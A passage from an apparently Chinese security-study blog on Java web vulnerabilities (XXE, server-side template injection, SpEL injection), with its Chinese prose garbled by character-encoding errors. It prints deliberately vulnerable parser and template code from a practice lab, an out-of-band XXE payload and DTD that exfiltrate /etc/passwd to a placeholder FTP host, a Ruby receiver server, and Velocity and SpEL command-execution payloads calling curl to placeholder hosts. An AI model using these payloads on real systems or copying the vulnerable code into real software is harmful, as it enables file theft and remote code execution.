DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(body);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            response(rootNodeList);</span><br><span class="line"></span><br><span class="line">            sr.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"DocumentBuilder xinclude xxe vuln code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"/XMLReader/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">XMLReaderVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            SAXParser saxParser = spf.newSAXParser();</span><br><span class="line">            XMLReader xmlReader = saxParser.getXMLReader();</span><br><span class="line">            xmlReader.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"XMLReader xxe vuln code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"/XMLReader/sec"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">XMLReaderSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            SAXParser saxParser = spf.newSAXParser();</span><br><span class="line">            XMLReader xmlReader = saxParser.getXMLReader();</span><br><span class="line">            xmlReader.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            xmlReader.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            xmlReader.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            xmlReader.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"XMLReader xxe security code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä¿®å¤è¯¥æ¼æ´åªéœ€å‡çº§dom4jåˆ°2.1.1åŠä»¥ä¸Šï¼Œè¯¥ç‰ˆæœ¬åŠä»¥ä¸Šç¦ç”¨äº†ENTITYï¼›</span></span><br><span class="line"><span class="comment">     * ä¸å¸¦ENTITYçš„PoCä¸èƒ½åˆ©ç”¨ï¼Œæ‰€ä»¥ç¦ç”¨ENTITYå³å¯å®Œæˆä¿®å¤ã€‚</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"/DocumentHelper/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DocumentHelper</span><span class="params">(HttpServletRequest req)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(req);</span><br><span class="line">            DocumentHelper.parseText(body); <span class="comment">// parse xml</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"DocumentHelper xxe vuln code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">response</span><span class="params">(NodeList rootNodeList)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">            Node rootNode = rootNodeList.item(i);</span><br><span class="line">            NodeList xxe = rootNode.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; xxe.getLength(); j++) &#123;</span><br><span class="line">                Node xxeNode = xxe.item(j);</span><br><span class="line">                <span class="comment">// æµ‹è¯•ä¸èƒ½blind xxeï¼Œæ‰€ä»¥å¼ºè¡ŒåŠ äº†ä¸€ä¸ªå›æ˜¾</span></span><br><span class="line">                logger.info(<span class="string">"xxeNode: "</span> + xxeNode.getNodeValue());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºã€‚å¯å¯¼è‡´XXEçš„xmlè§£æç±»æœ‰è®¸å¤šç§ã€‚åŒæ—¶è¿›è¡Œé˜²èŒƒæ—¶å¤§å¤šæ˜¯ä½¿ç”¨äº†<code>setFeature()</code>æ¥æŠŠæŸä¸ªç‰¹æ€§è®¾ç½®ä¸ºtrue/false.</p><p>ç®€å•çš„å†…å®¹åŒæ ·ä¸è°ˆã€‚è¿™é‡Œå…³äºjavaxxeçš„å‡ ä¸ªç‰¹æ€§ç¨å¾®ç ”ç©¶ä¸€ä¸‹ã€‚å…ˆæ‰¾ä¸ªèƒ½å›æ˜¾çš„è·¯ç”±<code>/DocumentBuilder/vuln01</code></p><ul><li>javaçš„xxeå¯åˆ—ç›®å½•ã€‚</li></ul><p>fileåè®®,netdocåè®®å‡å¯</p><p><code>file:/ , netdoc:/</code>å°±èƒ½åˆ—æ ¹ç›®å½•äº†ã€‚è¿™ç‚¹åœ¨æŸäº›å†™è¿‡æ»¤å¤§æ„çš„æƒ…å†µä¸‹å¯èƒ½ä¼šæœ‰å¸®åŠ©ï¼Œæ¯”å¦‚åªè¿‡æ»¤äº†<code>file://</code>çš„æƒ…å†µã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™ç‚¹æ›¾ç»åœ¨æŸä¸ªæ¯”èµ›ä¸­é‡åˆ°è¿‡ã€‚å½“æ—¶é¢˜ç›®åç«¯ä½¿ç”¨çš„æ˜¯phpã€‚ä½†æ˜¯å®ƒæœ‰ä¸€ä¸ªå°†xmlèŠ‚ç‚¹æ¸²æŸ“æˆå›¾ç‰‡å¹¶å›æ˜¾çš„åŠŸèƒ½ã€‚åƒè¿™ç§åŠŸèƒ½çš„åº•éƒ¨å®ç°å¾ˆæœ‰å¯èƒ½æ˜¯javaè¾¾æˆçš„ã€‚å› æ­¤åœ¨ä¸çŸ¥é“è·¯å¾„æ–‡ä»¶åè¯»å–æºç æ—¶å¯ä»¥é€šè¿‡åˆ—ç›®å½•è§£å†³é—®é¢˜ã€‚</p><ul><li>javaçš„xxeä¸èƒ½è¯»å–å¤šè¡Œçš„é—®é¢˜</li></ul><p>è¿™ä¸ªç›¸æ¯”è¾ƒphpè€Œè¨€ç®—æ˜¯æ¯”è¾ƒå¤§çš„é—®é¢˜ã€‚phpçš„ä¼ªåè®®ä¸ºå…¶è¯»å–æ–¹å¼å¸¦æ¥äº†å¾ˆå¤§çš„ä¾¿åˆ©,å¹¶ä¸”å‡ ä¹æ˜¯ä¸‡é‡‘æ²¹ã€‚ä½†æ˜¯javaçš„xxeæœ‰æ—¶è¯»å–ä¸åˆ°å¤šè¡Œå®Œå…¨æ˜¯å–å†³äºjdkçš„ç‰ˆæœ¬å¹¶ä¸”æ™®éå­˜åœ¨è¯»å–ä¸äº†<code>&lt; %</code>çš„é—®é¢˜ã€‚</p><p>é€šå¸¸æˆ‘ä»¬åœ¨ç›²æ‰“java oob xxeæ—¶æ™®éé€‰æ‹©ftpåè®®(å…¶å®æ˜¯å› ä¸ºæ”¯æŒçš„å¯å¤–è¿çš„åè®®åªæœ‰http/s ftp)ã€‚httpåªèƒ½è¯»å–å•è¡Œæ–‡ä»¶ã€‚ftpåˆ™åœ¨ä¸åŒç‰ˆæœ¬ä¸‹æœ‰ä¸åŒè¡¨ç°<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œå…¶ä»–å¤§ä½¬æ™®éé’ˆå¯¹è¿™ä¸ªé—®é¢˜è¿›è¡Œäº†ç ”ç©¶<br><a href="https://landgrey.me/blog/9/" target="_blank" rel="noopener">https://landgrey.me/blog/9/</a><br><a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">https://www.leadroyal.cn/?p=914</a><br>ç»“è®ºæ˜¯:</p><blockquote><p>ä½¿ç”¨ftp è¿›è¡Œ oob æ—¶ï¼Œå¯¹ç‰ˆæœ¬æœ‰é™åˆ¶ï¼Œ &lt;7u141 å’Œ &lt;8u162 æ‰å¯ä»¥è¯»å–æ•´ä¸ªæ–‡ä»¶,å…¨ç‰ˆæœ¬ http éƒ½åªå¯ä»¥è¯»å•è¡Œæ–‡ä»¶</p></blockquote><p>æ€»ä¹‹é‡åˆ°é—®é¢˜å…ˆæ‰“ä¸Šä¸€å‘çœ‹çœ‹ã€‚è¿™é‡Œæ”¾å‡ºftpserverçš„rubyä»£ç ã€‚å› ä¸ºvpsç«¯å£é—®é¢˜æˆ‘æŠŠç«¯å£æ”¹äº†</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span></span><br><span class="line">server = TCPServer.new <span class="number">8001</span></span><br><span class="line">loop <span class="keyword">do</span></span><br><span class="line">  Thread.start(server.accept) <span class="keyword">do</span> <span class="params">|client|</span></span><br><span class="line">    puts <span class="string">"New client connected"</span></span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line">    client.puts(<span class="string">"220 xxe-ftp-server"</span>)</span><br><span class="line">    loop &#123;</span><br><span class="line">        req = client.gets()</span><br><span class="line">        puts <span class="string">"&lt; "</span>+req</span><br><span class="line">        <span class="keyword">if</span> req.<span class="keyword">include</span>? <span class="string">"USER"</span></span><br><span class="line">            client.puts(<span class="string">"331 password please - version check"</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">           <span class="comment">#puts "&gt; 230 more data please!"</span></span><br><span class="line">            client.puts(<span class="string">"230 more data please!"</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xxxx/evil.dtd"</span>&gt;</span>%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://fakeuser:fakepass@xxxxxxxx:8001/%payload;'&gt;"</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%trick</span><br></pre></td></tr></table></figure><p>å½“ç„¶ä»¥ä¸Šé’ˆå¯¹çš„æ˜¯OOB.ä¹Ÿå°±æ˜¯ç›²æ‰“å¤–å¸¦çš„æ–¹æ³•</p><ul><li>Xinclude xxe</li></ul><p>è¿™ç‚¹æˆ‘å€’æ˜¯éå¸¸æ„Ÿå…´è¶£ã€‚å› ä¸ºå‰ä¸ä¹…çš„htb Quickè¿™å°é¶æœºå°±ç”¨åˆ°äº†xinclude+xsltçš„RCE(æ²¡é”™,å…¶å®æ˜¯å¼•å…¥é€šè¿‡å¤–éƒ¨xmlè¾¾æˆRCE)</p><p>å½“ç„¶ä¸æ˜¯æ‰€æœ‰æœåŠ¡éƒ½èƒ½åƒEsigateé‚£æ ·æœ‰è¿™ä¹ˆä½çº§çš„é”™è¯¯ã€‚æ­£å¸¸æ¥è¯´æˆ‘ä»¬ä¸€èˆ¬æ˜¯å¯ä»¥å°è¯•xxeè¯»æ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯¹äºphpè€Œè¨€ã€‚ä¸éœ€è¦æ‰“å¼€å¤–éƒ¨å®ä½“å¼•ç”¨é€‰é¡¹ï¼Œä¹Ÿèƒ½ä½¿ç”¨xincludeè¯»å–æœ¬åœ°æ–‡ä»¶ã€‚</p><p>è¿™é‡Œé¡ºä¾¿åˆ†äº«ä¸‹htb é‚£é‡Œå‚è€ƒçš„æ–‡ç« ã€‚æˆ‘è®¤ä¸ºå…¶åˆ©ç”¨å¯¹äºæå‡xxeä½œç”¨è¿™ç‚¹æ˜¯å¾ˆæœ‰å‚è€ƒä»·å€¼çš„ã€‚<a href="https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/</a></p><p>æ€»è€Œè¨€ä¹‹,javaè¿›è¡Œxxeç›¸æ¯”å¸¸è§çš„phpåç«¯è€Œè¨€å¤šäº†è®¸å¤šé™åˆ¶ã€‚ä½†æ˜¯å¯ä»¥åˆ—ç›®å½•è¿™ç‚¹æ˜¯å…³é”®ã€‚åŒæ—¶é‡åˆ°è¦ç›²æ‰“æ—¶ï¼Œftpæ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚é˜²å¾¡ä¸Š,ä½¿ç”¨setFeatureå°±èƒ½è®©å¤–éƒ¨å®ä½“ä¸è¢«åŠ è½½ã€‚</p><h3 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h3><p>Javaçš„sstiç›¸æ¯”è¾ƒjinjaç­‰ç­‰è€Œè¨€è¿˜æ˜¯å¾ˆå¥½ç†è§£çš„ã€‚åªæ˜¯å¯¹äºä¸åŒæ¡†æ¶åº”å¯¹æ‰‹æ®µä¸åŒ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.joychou.controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.Velocity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/ssti"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SSTI</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * SSTI of Java velocity. The latest Velocity version still has this problem.</span></span><br><span class="line"><span class="comment">     * Fix method: Avoid to use Velocity.evaluate method.</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22)</span></span><br><span class="line"><span class="comment">     * Open a calculator in MacOS.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> template exp</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/velocity"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">velocity</span><span class="params">(String template)</span> </span>&#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line"></span><br><span class="line">        VelocityContext context = <span class="keyword">new</span> VelocityContext();</span><br><span class="line"></span><br><span class="line">        context.put(<span class="string">"author"</span>, <span class="string">"Elliot A."</span>);</span><br><span class="line">        context.put(<span class="string">"address"</span>, <span class="string">"217 E Broadway"</span>);</span><br><span class="line">        context.put(<span class="string">"phone"</span>, <span class="string">"555-1337"</span>);</span><br><span class="line"></span><br><span class="line">        StringWriter swOut = <span class="keyword">new</span> StringWriter();</span><br><span class="line">        Velocity.evaluate(context, swOut, <span class="string">"test"</span>, template);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„æ˜¯ä¸€ä¸ªVelocityçš„sstiã€‚payloadæ˜¯<code>#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;curl xxxx&quot;)</code></p><p>å¯ä»¥çœ‹å‡ºæ¸²æŸ“çš„è¯­å¥æ˜¯<code>#</code>å¼€å¤´åæ¥ä¸€ä¸ªåå°„æ„é€ çš„å‘½ä»¤æ‰§è¡Œpayload.<code>$e</code>ä¸ºå­—ç¬¦ä¸²ã€‚å› æ­¤åé¢å°±æ˜¯ä»<code>java.lang.String</code>å¯¹è±¡å¼€å§‹è·å–ç±»ï¼Œæ–¹æ³•ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p><p>è¿™ç‚¹ä¸Šä»æŸç§è§’åº¦ä¸SpELéå¸¸ç›¸ä¼¼ã€‚å½“ç„¶åé¢åšSpELæ³¨å…¥æ—¶å†ç»†è®²ã€‚è¿™é‡Œåˆ†äº«ä¸€ä¸ªä¹‹å‰åœ¨SharkyCTFä¸­é‡åˆ°çš„Thymeleaf sstiã€‚å› ä¸ºå½“æ—¶é¢˜ç›®åç«¯æŠŠå„ç§å‘½ä»¤æ‰§è¡Œéƒ½hookäº†,è‡ªå·±ä¸€ç›´æ²¡èƒ½æˆåŠŸæ‰§è¡Œå‘½ä»¤,è™½ç„¶å®é™…ä¸Šä¸éœ€è¦å‘½ä»¤æ‰§è¡Œå°±èƒ½åš,ä½†æ˜¯æŸ¥èµ„æ–™çš„è¿‡ç¨‹ä¸­ä¹Ÿæœ‰äº†æ–°çš„æ”¶è·ã€‚</p><p><a href="https://ctftime.org/task/11563" target="_blank" rel="noopener">https://ctftime.org/task/11563</a></p><p>è¿™é¢˜å› ä¸ºä½¿ç”¨äº†Thymeleaf.åŠ ä¸Šæˆ‘åœ¨ä½¿ç”¨<code>[[${7*7}]]</code>æ—¶è¿”å›äº†49ã€‚æ‰€ä»¥æˆ‘è®¤ä¸ºæ˜¯ä½¿ç”¨äº†<code>Thymeleaf</code>æ¥è¿›è¡Œæ¸²æŸ“çš„ã€‚(Thymeleafæ˜¯é€šè¿‡ä¸¤ä¸ªä¸­æ‹¬å·å–å€¼çš„)å¯æƒœé¢˜ç›®åº•å±‚hookçš„éå¸¸ä¸¥,æ²¡èƒ½RCEã€‚è¯»æ–‡ä»¶çš„payload<br><code>[[${ new java.io.BufferReader(new java.io.FileReader(&quot;/etc/passwd&quot;)).readLine()}]]</code>éƒ½åšä¸åˆ°ã€‚æ¯”èµ›ç»“æŸåæ‰å‘ç°è¦çŒœflagè¿™ä¸ªclassçš„å­˜åœ¨çš„,æ¯”è¾ƒæ— è¯­ã€‚ä½†æ˜¯ä»ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡º,java sstiå…¶å®å°±æ˜¯åˆ¤æ–­å‡ºå¯¹åº”å¼•æ“åç”¨æ¥è¿‘äºSpELçš„æ€è·¯æ¥è¿›è¡Œåˆ©ç”¨ã€‚å¦åˆ™å°±æ˜¯åˆ©ç”¨é¢˜ç›®ç¯å¢ƒä¸­çš„classè¯»å–å˜é‡.</p><p>æ¯”èµ›ä¸­å½“æ—¶å‚è€ƒäº†è¿™ç¯‡æ–‡ç« <a href="https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/" target="_blank" rel="noopener">https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/</a><br>å…¶å®ä»”ç»†æƒ³æƒ³æ€ä¹ˆçœ‹éƒ½æ˜¯SpELçš„æ„æ€â€¦â€¦æ‰€ä»¥ç›¸å…³æŠ€å·§è¿˜æ˜¯ç•™åˆ°ä¸‹ä¸€ç¯‡SpELè®²å§ã€‚</p><h3 id="SpEL"><a href="#SpEL" class="headerlink" title="SpEL"></a>SpEL</h3><p>vuln code</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.joychou.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * SpEL Injection</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> JoyChou @2019-01-17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpEL</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * SPEL to RCE</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/spel/vul/?expression=xxx.</span></span><br><span class="line"><span class="comment">     * xxx is urlencode(exp)</span></span><br><span class="line"><span class="comment">     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/spel/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">rce</span><span class="params">(String expression)</span> </span>&#123;</span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">        <span class="comment">// fix method: SimpleEvaluationContext</span></span><br><span class="line">        <span class="keyword">return</span> parser.parseExpression(expression).getValue().toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">        String expression = <span class="string">"T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")"</span>;</span><br><span class="line">        String result = parser.parseExpression(expression).getValue().toString();</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆ,SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ æ˜¯EL(expression 